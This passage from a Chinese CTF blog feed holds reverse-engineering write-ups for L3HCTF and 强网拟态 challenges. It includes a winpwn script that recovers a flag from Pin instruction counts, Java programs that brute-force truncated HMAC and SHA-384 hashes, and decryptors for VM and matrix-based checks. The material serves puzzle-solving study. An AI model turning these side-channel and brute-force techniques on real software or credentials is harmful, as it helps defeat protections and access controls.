OPND_CREATE_INT32(num_instrs));    return DR_EMIT_DEFAULT;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="使用python-winpwn进行爆破"><a href="#使用python-winpwn进行爆破" class="headerlink" title="使用python winpwn进行爆破"></a>使用python winpwn进行爆破</h4><p>这里可以用C++ 的windows api来进行爆破, 使用重定向输入和输出创建子进程.</p><p>微软的官方文档里面相应的样例代码:</p><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output">https://docs.microsoft.com/zh-cn/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output</a></p><p>我使用的是winpwn这个工具来进行爆破, 我稍微看了一下程序创建过程, 本质上还是python去调用windows api, 和C++调用windows API大致一样</p><p>爆破脚本:</p><pre class="line-numbers language-none"><code class="language-none">from winpwn import *import threadingfrom concurrent.futures import ThreadPoolExecutor, Futuredef test(data):    tmp = data    cmd = '' #your pin.exe path    module = '' #your pintool.dll path    p = process([cmd, '-t', module, '--', '.\\low_re.exe'])    #p = process([cmd, '-c', module, '-only_from_app', '--', '.\\low_re.exe']) //dynamorio的命令行    p.recvline()    p.recvline()    p.sendline(data)    data = p.recvuntil("\n")    if (data[0:5] != "Count"):        data = p.recvuntil("\n")    data = int(data.split("Count ")[1].split(" ")[0])    #if (data[0:5] != "Instr"): //dynamorio的输出        #data = p.recvuntil("\n")    #data = int(re.findall('\d+', data)[0])    p.close()    return datapool = ThreadPoolExecutor(8)testlen = 17if (testlen):    flag = ""    while len(flag) != testlen:        tasks = []        results = []        for i in range(32, 0x7f):            data = flag + chr(i) + 'i' * (testlen - 1 - len(flag))            tasks.append(pool.submit(test, data))        for t in tasks:            results.append(t.result())        #print(chr(a.index(max(a)) + 32))        flag += chr(results.index(max(results)) + 32)        print(flag)else:    i = 1    a = []    while i &lt; 64:        a.append(test(i * '1'))        i += 1    print(a.index(max(a)) + 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里值得注意的是, 最后输出的Count xxx 是输出到错误信息里面的, 并且是以’\n’结尾所以不能直接使用recvline().</p><p>winpwn部分源代码:</p><pre class="line-numbers language-none"><code class="language-none">def recvline(self,timeout=None,newline=None):        if newline is None:            newline=context.newline #newline='\r\n'         return self.recvuntil(newline)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>winpwn调用了win.py </p><p>write相关调用:</p><pre class="line-numbers language-none"><code class="language-none">def write(self,buf=''):        buf=Latin1_encode(buf)        length=len(buf)        written=wintypes.DWORD()        x=windll.kernel32.WriteFile(self.hWritePipe,buf,length,byref(written),None) //这个就是windows api了        if x==0:            raise(EOFError())        return written.value<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>l3hctf_part_wp</title>
      <link href="/2021/11/17/l3hctf-part-wp/"/>
      <url>/2021/11/17/l3hctf-part-wp/</url>
      
        <content type="html"><![CDATA[<p>double-joy 和 load</p><span id="more"></span><h3 id="double-joy"><a href="#double-joy" class="headerlink" title="double-joy"></a>double-joy</h3><p>找到具体加密函数:</p><pre class="line-numbers language-none"><code class="language-none">__int64 __fastcall sub_558A3CFB3D90(__int64 *a1){  __int64 v1; // rcx  __int64 i; // rsi  __int64 v3; // rax  v1 = *a1;  for ( i = *((int *)a1 + 4); ; ++i )  {    v3 = *(unsigned __int8 *)(v1 + i);    *((_DWORD *)a1 + 4) = i + 1;    if ( (unsigned __int8)v3 &lt;= 0x12u )      break;  }  return ((__int64 (*)(void))((char *)dword_558A3CFB5004 + dword_558A3CFB5004[v3]))();}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里是主要是后面的比较关键, 前面的就是取一下指令.</p><p>传入的参数我把它改成一个结构体, 具体结构体的定义在Structures里面.</p><pre class="line-numbers language-none"><code class="language-none">00000000 vm              struc ; (sizeof=0x18, mappedto_16)00000000 opcode          dq ?00000008 mem             dq ?00000010 index           dd ?00000014 point           dd ? //指向内存的索引, 总是指向最后一个值的下一位置00000018 vm              ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看流程图窗口, 是有非常多的分支的, 具体跳转位于</p><pre class="line-numbers language-none"><code class="language-none">text:000055E187261DBD 49 63 04 81 movsxd  rax, dword ptr [r9+rax*4].text:000055E187261DC1 4C 01 C8    add     rax, r9.text:000055E187261DC4             db      3Eh.text:000055E187261DC4 3E FF E0    jmp     rax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们将每一个rax改为对应的硬编码, 就可以查看微代码了.</p><p>这里我大概总结了一下要用到的指令作用(具体细节记录得很丑陋, 就不放出来了:</p><pre class="line-numbers language-none"><code class="language-none">0 加法 1 减法 2 乘法 3 除法(带符号) 这里要注意一定要带符号5 与 7 异或 8 2字节内存赋值 mem[mem[point-2]] = mem[point-1]9 mem[point-1]作为索引, 再对mem[point-1]赋值a 非 b 判断是否&lt;0 c 对最后两个值交换 f 跳转指令 10 判断跳转 11 改变索引12 return<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后逐一分析指令集(一共有两套), 可以发现, 两套加密是轮换来的, 并且第一次加密都会有异或,(这也是为什么后面加密其他字节都不改变, 但是头两次加密其他字节都发生变化的原因) 对两个字节的加密, 都需要加密20次才会轮到下两个字节加密. 两套指令分别使用两个结构体和两段内存, 每个内存中都一直存在一个字节, 表示加密次数.</p><p>解密脚本: (加密过程写在里面了)</p><pre class="line-numbers language-none"><code class="language-none">#include&lt;iostream&gt;uint32_t key = 448431333;uint32_t key2 = 3848427296;int encode1(uint32_t flag[2]){    int key1[4] = {0x494C, 0x6F76, 0x6520, 0x4355};    uint32_t b = (flag[1] * 0x10);    uint32_t a = ((signed)flag[1] / 0x20);    uint32_t c = ((a ^ b) + flag[1]);    uint32_t d = (c ^ (key + key1[key &amp; 3]));// 6f76    flag[0] = d + flag[0];    key += 0x75BCD15;    uint32_t e = (flag[0] * 0x10);    uint32_t f = ((signed)flag[0] / 0x20);    uint32_t g = (e ^ f);    uint32_t h = g + flag[0];    uint32_t i = h ^ (key + key1[((signed)key / 0x800) &amp; 3]);    flag[1] = i + flag[1];    return 0;}void decode1(uint32_t flag[2]){    int key1[4] = {0x494C, 0x6F76, 0x6520, 0x4355};    uint32_t e = (flag[0] * 0x10);    uint32_t f = ((signed)flag[0] / 0x20);    uint32_t g = ( e^f );    uint32_t h = g + flag[0];    uint32_t i = h ^ (key + key1[((signed)key / 0x800) &amp; 3]);    flag[1] = flag[1] - i;    key -= 0x75BCD15;    uint32_t b = (flag[1] * 0x10);    uint32_t a = ((signed)flag[1] / 0x20);    uint32_t c = ((a ^ b) + flag[1]);    uint32_t d = (c ^ (key + key1[key &amp; 3]));// 6f76    flag[0] -= d;    return;}int decode2(uint32_t flag[2]){    key2 -= 0x154CBF7;    uint32_t b1 = (flag[0] * 0x10 + 0x2074);    uint32_t c1 = (key2 + flag[0]);    uint32_t a1 = ((signed)flag[0] / 0x20 + 0x6561);    uint32_t d1 = (c1 ^ a1);    uint32_t e1 = d1 ^ b1;    flag[1] -= e1;    uint32_t b = (flag[1] * 0x10 + 0x5354);    uint32_t c = (key2 + flag[1]);    uint32_t a = ((signed)flag[1] / 0x20 + 0x4f4d);    uint32_t d = (c ^ a);    uint32_t e = d ^ b;    flag[0] -= e;    return 0;}int encode2(uint32_t flag[2]){    key2 += 0x154CBF7;    uint32_t b = (flag[1] * 0x10 + 0x5354);    uint32_t c = (key2 + flag[1]);    uint32_t a = ((signed)flag[1] / 0x20 + 0x4f4d);    uint32_t d = (c ^ a);    uint32_t e = d ^ b;    uint32_t f = e + flag[0];    flag[0] = f;    uint32_t b1 = (flag[0] * 0x10 + 0x2074);    uint32_t c1 = (key2 + flag[0]);    uint32_t a1 = ((signed)flag[0] / 0x20 + 0x6561);    uint32_t d1 = (c1 ^ a1);    uint32_t e1 = d1 ^ b1;    uint32_t f1 = e1 + flag[1];    flag[1] = f1;    return 0;}int main(){    uint32_t flag[10] = { 0xAEE0FAE8, 0xFC3E4101, 0x167CAD92, 0x51EA6CBE, 0x242A0100, 0x01511A1B, 0x514D6694, 0x2F5FBFEB,     0x46D36398, 0x79EEE3F0};    for (int i = 8; i &gt;= 0; i-=2)    {        for (int j = 19; j &gt;= 0; j--)        {            decode2(flag + i);            if (i == 0 &amp;&amp; j == 0)            {                flag[0] ^= 0x1010101;                flag[1] ^= 0x2020202;            }            decode1(flag + i);            if (i == 0 &amp;&amp; j == 0)            {                flag[0] ^= 0x1010101;                flag[1] ^= 0x2020202;            }            int m = 3;        }        int n = 3;    }    for (int i = 0; i &lt; 9; i++)    {        for (int j = 0; j &lt; 4; j++)            printf("%c", *((char *)&amp;flag[i] + j));    }    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><p>这里打开了一个文件映射, 并且把输入复制到文件中:</p><pre class="line-numbers language-none"><code class="language-none">FileMappingW = CreateFileMappingW(0xFFFFFFFF, 0, 4u, 0, 0x400u, Name);v7 = MapViewOfFile(FileMappingW, 0xF001Fu, 0, 0, 0x400u);strncpy(v7, Source, 0x3FFu);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>接下来创建了一个进程, 进程对输入进行处理.</p><p>这里的进程我没有去dump, 我dump也发生了错误, 所以我直接用ida去附加这个进程, 不管具体子进程如何变化基本上都能分析.在恢复线程执行的函数下好断点, 保证主进程的处理都执行过了. 然后附加好了之后, 选中所有的load.exe段, 让ida分析, 就可以找到关键函数.下好断点, 直接运行, 转过来单步主进程, 就可以在断下来了(注意, 这里会有一个软件断点, 直接pass给进程就可以了)</p><p>读取从文件中读取输入</p><pre class="line-numbers language-none"><code class="language-none">v0 = kernel32_OpenFileMappingW(983071, 0, aL3hsec); vcruntime140_memset(v26, 0, 1024); if ( v0 ) {   v1 = kernel32_MapViewOfFile(v0, 983071, 0, 0, 0);   v2 = (char *)v1;   do   {     v3 = *v2++;     v26[(_DWORD)v2 - v1 - 1] = v3;   }   while ( v3 );   kernel32_UnmapViewOfFile(v1);   kernel32_CloseHandle(v0); }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>字符串每两字节转换为16进制,类似于atoi函数. </p><pre class="line-numbers language-none"><code class="language-none">do    {      v6 = *((_BYTE *)&amp;v30 + v5);      if ( v6 &gt;= '0' &amp;&amp; v6 &lt;= '9' )      {        v6 -= '0';        *((_BYTE *)&amp;v30 + v5) = v6;      }      if ( (unsigned __int8)(v6 - 'a') &lt;= 5u )        *((_BYTE *)&amp;v30 + v5) = v6 - 'W';      ++v5;    }    while ( v5 &lt; v4 );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来大概就是通过伴随矩阵求逆矩阵</p><p>A* / |A| = A-1</p><p>这里需要用到一个代数余子式的东西, 具体都是线代里面的内容</p><p>a1 a2 a3 </p><p>a4 a5 a6</p><p>a7 a8 a9</p><p>tmp = a1 * (a5 * a9 - a8 * a6) - a2 * (a4 * a9 - a7 * a6) + a3 * (a4 * a8 - a7 * a5)</p><p>m1 = (a5 * a9 - a8 * a6) / tmp</p><p>m2 = -(a4 * a9 - a7 * a6) / tmp (符号分别正负顺序(根据位置决定))</p><p>…….</p><pre class="line-numbers language-none"><code class="language-none">sub_401070(3, (int)v34, 0);                   // v34赋值 sub_401070(2, (int)v25, 9);                   // v25赋值 sub_401370(v34, 3);                           // 矩阵运算 sub_401370(v25, 2);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解密: 矩阵的逆矩阵只需要再求一次逆矩阵就是本身了.</p><pre class="line-numbers language-none"><code class="language-none">import numpy as npa  = np.array([[1,0,-9],[0,-1,-6],[-1,-2,-4]])  # 初始化一个非奇异矩阵(数组)# print(np.linalg.inv(a))  # 对应于MATLAB中 inv() 函数# # 矩阵对象可以通过 .I 更方便的求逆A = np.matrix(a)print(A.I)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag:</p><p>flag{f812f706f306ff02ff0dfde207}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>强网拟态</title>
      <link href="/2021/10/25/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/"/>
      <url>/2021/10/25/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/</url>
      
        <content type="html"><![CDATA[<h4 id="HaHaHaHa"><a href="#HaHaHaHa" class="headerlink" title="HaHaHaHa"></a>HaHaHaHa</h4><span id="more"></span><p>找到关键代码在mainactivity中.</p><p>输入处理:</p><pre class="line-numbers language-none"><code class="language-none">byte[] v7_1 = a.c(v1_1[v6]);.... while(v9 &lt; v7_1.length) {                v10 = v10 &lt;&lt; 1 | (v7_1[v9] &amp; 0x80) &gt;&gt;&gt; v2;                v7_1[v9] = ((byte)(v7_1[v9] &amp; 0x7F));                ++v9;            }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关键比较:</p><pre class="line-numbers language-none"><code class="language-none">String v9_1 = a.a(v10, v7_1);           if(v9_1 != null &amp;&amp; (v9_1.equals(a.a(a.b[v6], v7_1)))) {               if(!v9_1.equals(a.c[v6])) {               }               else {                   ++v6;                   continue;               }           }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要a类中的字符串数组C要等同于a方法对v7_1处理的结果.</p><p>查看A类a方法, 可以看到是根据a.b[v6]进行hash加密, 任选了一个进行爆破, 爆不出来. 仔细翻了翻了, 前面的welcomeactivity类更改了a密钥byte数组和b数组.</p><pre class="line-numbers language-none"><code class="language-none">for(v0 = 0; true; ++v0) {            int[] v1 = a.b;            if(v0 &gt;= v1.length) {                break;            }            v1[v0] ^= 0xAB;        }....while(v4 &lt; a.a.length) {            try {                v0_1 = MessageDigest.getInstance("MD5");            }            catch(NoSuchAlgorithmException v1_1) {                v1_1.printStackTrace();            }            v0_1.update(a.a[v4]);            a.a[v4] = v0_1.digest();            ++v4;        }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对密钥进行MD5.</p><p>当b数组的值&lt;8时, 不使用密钥, hash加密的方式不同, b数组&gt;=8时, 相同的hash加密HmacSha512, 不同密钥.</p><p>这样就直接开始爆破, 8组数据, 范围为4个0-0x7f字节.直接抄程序反编译代码去爆破</p><p>HmacSha512: 将密钥和密文对应就行</p><pre class="line-numbers language-none"><code class="language-none">import java.nio.charset.StandardCharsets;import java.math.BigInteger;import java.security.GeneralSecurityException;import java.security.InvalidKeyException;import java.security.Key;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;import javax.crypto.Mac;import javax.crypto.spec.SecretKeySpec;public class demo {    public static final String v0 = "HmacSha512";    public static void main(String[] args) {        MessageDigest v0_1 = null;        StringBuilder v1_2;        byte[] miwen = new byte[4];        String v6_1 = "%02x";        try {            for (int i=0x0; i&lt;=0x7e; i++) {                miwen[0] = (byte)i;                for (int j = 0x0; j &lt;= 0x7e; j++) {                    miwen[1] = (byte)j;                    for (int k = 0x0; k &lt;= 0x7e; k++) {                        miwen[2] = (byte)k;                        for (int l = 0x0; l &lt;= 0x7e; l++) {                            miwen[3] = (byte)l;                            try {                                v0_1 = MessageDigest.getInstance("MD5");                            }                            catch(NoSuchAlgorithmException v1_1) {                                v1_1.printStackTrace();                            }                            byte[] tmp = "ALFjcgztxnUaC89v".getBytes();                            v0_1.update(tmp);                            byte[] miwen2 = v0_1.digest();                            SecretKeySpec v1 = new SecretKeySpec(miwen2, v0);                            Mac v3 = Mac.getInstance(v0);                            v3.init(((Key)v1));                            v3.update(miwen);                            String v2_2;                            String s = "78b0be39e63b6837";                            for(v2_2 = new BigInteger(1, v3.doFinal()).toString(16); v2_2.length() &lt; 0x20; v2_2 = "0" + v2_2) {                            }                            if (v2_2.substring(0,16).equals(s)) {                                System.out.printf("%x ", i);                                System.out.printf("%x ", j);                                System.out.printf("%x ", k);                                System.out.printf("%x ", l);                                System.out.printf("%n");                                return;                            }                        }                    }                }            }        }        catch(InvalidKeyException | NoSuchAlgorithmException v2) {            return;        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>无密钥hash: 将hash方法和密文对应</p><pre class="line-numbers language-none"><code class="language-none">import java.nio.charset.StandardCharsets;import java.math.BigInteger;import java.security.GeneralSecurityException;import java.security.InvalidKeyException;import java.security.Key;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;import javax.crypto.Mac;import javax.crypto.spec.SecretKeySpec;public class demo5 {    public static final String v0 = "HmacSha512";    public static void main(String[] args) {        MessageDigest v1_11;        byte[] miwen2;        byte[] miwen = new byte[4];        String v6_1 = "%02x";        StringBuilder v1_2;        for (int i=0x0; i&lt;=0x7e; i++) {            miwen[0] = (byte)i;            for (int j = 0x0; j &lt;= 0x7e; j++) {                miwen[1] = (byte)j;                for (int k = 0x0; k &lt;= 0x7e; k++) {                    miwen[2] = (byte)k;                    for (int l = 0x0; l &lt;= 0x7e; l++) {                        miwen[3] = (byte)l;                        String s = "f2dda5fc021fe2bf";                        try {                            v1_11 = MessageDigest.getInstance("SHA-384"                            );                            v1_11.update(miwen);                            miwen2 = v1_11.digest();                            v1_2 = new StringBuilder();                            for(int v4 = 0; v4 &lt; miwen2.length; ++v4) {                                v1_2.append(String.format(v6_1, Byte.valueOf(miwen2[v4])));                            }                            String tmp = v1_2.toString().substring(0,16);                            if (tmp.equals(s)){                                System.out.printf("%x ", i);                                System.out.printf("%x ", j);                                System.out.printf("%x ", k);                                System.out.printf("%x ", l);                                System.out.printf("%n");                                return;                            }                        }                        catch(NoSuchAlgorithmException v0_2) {                            v0_2.printStackTrace();                        }                    }                }            }        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我没有再去考虑大于7F的输入, 我直接分析flag的输出:</p><pre class="line-numbers language-none"><code class="language-none">if((v10 &gt;&gt;&gt; 3 &amp; 1) == 0) {    v6_1[v10 &amp; 7] = new String(v8_1);}else {    for(v9 = 0; v9 &lt; v8_1.length / v5; ++v9) {        byte v11 = v8_1[v9];        v8_1[v9] = v8_1[v8_1.length - 1 - v9];        v8_1[v8_1.length - 1 - v9] = v11;    }    v6_1[v10 &amp; 7] = new String(v8_1); // 输出顺序和加密方式有关}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里可以看到, 如果使用了HmacSha512, 需要反序.</p><p>最后爆破了半天得到flag.</p><pre class="line-numbers language-none"><code class="language-none">FLAG{H@5H_15_7H3_8@PP1N355_C11P}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Studydesk"><a href="#Studydesk" class="headerlink" title="Studydesk"></a>Studydesk</h4><p>输入处理:</p><pre class="line-numbers language-none"><code class="language-none">byte[] v0 = a.a;.....if(v6 &lt; v5) {                    v9 = in.indexOf(v0[v6]);                    if(v9 == -1) {                        v0 = ((byte[])v7);                    }                    else {                        v4.append(Integer.toBinaryString((v9 &amp; 0x3F) + v2).substring(1));                        ++v6;                        continue;                    }                }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入为32字节, 然后依次查询a类的a数组再输入中的位置, 将位置+32后转化为2进制去掉首位保存字符串.</p><p>保存的范围就是00000 - 11111, 一共是16个.</p><p>查看a类的a数组, 可以编写脚本处理发现只有32种. 要求的是每个数都再输入中能找到, 不能重复.</p><p>之后就是2进制连起来, 依次取8位, 转化为byte数组.</p><p>密文的生成直接抄反编译代码, 然后调试可以发现, 是圆周率. 长度是360位. </p><p>校验:</p><pre class="line-numbers language-none"><code class="language-none">while(true) {               if(v3_3 &lt; v2_2.length()) {                   v4_1 = v3_3 + 2;                   if((((byte)(Integer.parseInt(v2_2.substring(v3_3, v4_1), 10) &amp; 0xFF))) != v0[v3_3 / 2]) {                       v0_1 = 0;                   }                   else {                       v3_3 = v4_1;                       continue;                   }               }               else {                   break;               }               goto label_120;           }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要求的是依次取圆周率字符串2位, 视为10进制数和5位2进制数生成的byte数组一一比较, 一共180次.</p><p>这里不妨算一下, a数组的长度为288位, 转化出来的2进制长度为288 * 5 == 1440, 密文长度是180 * 8 == 1440, 刚好对应.</p><pre class="line-numbers language-none"><code class="language-none">c = [0x73, 0x6F, 43, 0x72, 0x74, 45, 0x30, 36, 84, 98, 89, 36, 38, 66, 38, 43, 84, 0x79, 50, 101, 101, 43, 100, 87, 69, 0x6F, 51, 66, 89, 49, 69, 51, 101, 51, 53, 0x74, 45, 98, 98, 0x72, 50, 36, 98, 50, 85, 85, 85, 107, 66, 36, 53, 51, 0x6F, 0x72, 89, 89, 66, 50, 33, 66, 0x5F, 66, 101, 0x79, 0x5F, 0x40, 33, 66, 50, 0x40, 85, 85, 45, 43, 36, 50, 0x74, 0x30, 85, 0x73, 0x5F, 0x40, 49, 0x72, 50, 101, 101, 51, 51, 43, 53, 51, 53, 51, 85, 50, 0x40, 0x79, 53, 36, 0x40, 69, 89, 98, 45, 0x6F, 101, 36, 97, 66, 100, 0x30, 0x73, 97, 0x30, 36, 0x6F, 101, 50, 0x5F, 49, 0x30, 0x40, 89, 0x74, 85, 0x30, 85, 0x73, 89, 43, 89, 97, 0x30, 89, 0x72, 97, 100, 38, 50, 0x74, 51, 98, 0x75, 0x5F, 50, 0x74, 0x73, 0x6F, 84, 98, 89, 69, 0x6F, 100, 0x30, 0x6F, 98, 89, 0x72, 0x40, 50, 36, 66, 89, 101, 0x72, 51, 84, 51, 50, 36, 38, 0x40, 0x30, 53, 51, 0x30, 49, 97, 0x74, 89, 101, 85, 97, 66, 84, 97, 45, 43, 100, 89, 45, 0x30, 0x73, 0x30, 0x40, 97, 100, 98, 51, 100, 0x6F, 0x73, 50, 53, 101, 66, 101, 0x6F, 0x75, 50, 45, 0x5F, 51, 82, 50, 89, 87, 101, 50, 89, 0x30, 89, 101, 43, 89, 36, 38, 61, 101, 0x40, 84, 89, 0x5F, 66, 0x74, 49, 0x40, 87, 97, 43, 0x5F, 0x73, 43, 0x30, 89, 45, 84, 89, 33, 89, 107, 53, 85, 0x30, 98, 98, 0x5F, 50, 107, 66, 101, 0x6F, 51, 97, 33, 66, 97, 0x75, 51, 0x74, 51, 97, 0x40, 89, 107, 98, 51, 69, 0x40, 73, 0x5F, 0x30, 85, 0x74, 0x30, 97]b = []for i in range(0x20):    b.append("{0:b}".format(i).zfill(5))a = [31,41,59,26,53,58,97,93,23,84,62,64,33,83,27,95,2,88,41,97,16,93,99,37,51,5,82,9,74,94,45,92,30,78,16,40,62,86,20,89,98,62,80,34,82,53,42,11,70,67,98,21,48, 8,65,13,28,23, 6,64,70,93,84,46, 9,55, 5,82,23,17,25,35,94, 8,12,84,81,11,74,50,28,41, 2,70,19,38,52,11, 5,55,96,44,62,29,48,95,49,30,38,19,64,42,88,10,97,56,65,93,34,46,12,84,75,64,82,33,78,67,83,16,52,71,20,19, 9,14,56,48,56,69,23,46, 3,48,61, 4,54,32,66,48,21,33,93,60,72,60,24,91,41,27,37,24,58,70, 6,60,63,15,58,81,74,88,15,20,92, 9,62,82,92,54, 9,17,15,36,43,67,89,25,90,36]d = ""for i in a:    d += "{0:b}".format(i).zfill(8)e = [0] * 32k = 0i = 0while i &lt; 8 * 180:    for j in range(len(b)):        if d[i:i + 5] == b[j]:            e[j] = c[k]            k += 1    i += 5        for i in e:    print(chr(i), end="")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加上flag{}就ok.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn_start</title>
      <link href="/2021/10/04/pwn-start/"/>
      <url>/2021/10/04/pwn-start/</url>
      
